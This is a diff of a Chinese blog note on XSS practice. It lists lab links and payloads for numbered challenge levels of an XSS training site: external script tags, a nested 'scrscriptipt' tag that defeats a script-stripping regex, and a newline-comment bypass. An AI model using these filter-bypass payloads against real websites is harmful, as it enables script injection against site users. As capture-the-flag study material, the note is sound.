@@ -4,17 +4,11 @@ title: "XSS练习"
 date: 2019-10-29 01:01
 ---
 
+[TOC]
+
 ## 实验平台
 https://curtails.github.io/xss/
 https://xss.haozi.me
-
-## XSS绕过方法总结
-`<scirpt>`
-```js
-<script>alert(1)</script>
-<script>alert(1);</script>
-<script>alert("1")</script>
-```
 
 ## xss-demo
 [github](https://github.com/haozi/xss-demo/)  
@@ -74,3 +68,26 @@ type=image src onerror
 ```js
 https://www.segmentfault.com.haozi.me/j.js
 ```
+
+- 0X0b
+标签、域名不区分大小写
+```
+<script src="https://www.segmentfault.com.haozi.me/j.js"></script>
+```
+
+- 0x0c
+正则替换script为空
+```
+<scrscriptipt src="https://www.segmentfault.com.haozi.me/j.js"></scrscriptipt>
+```
+
+- 0x0d
+换行加单行注释绕过
+```
+ 
+alert(1)
+-->
+```
+
+- 0x0e
+
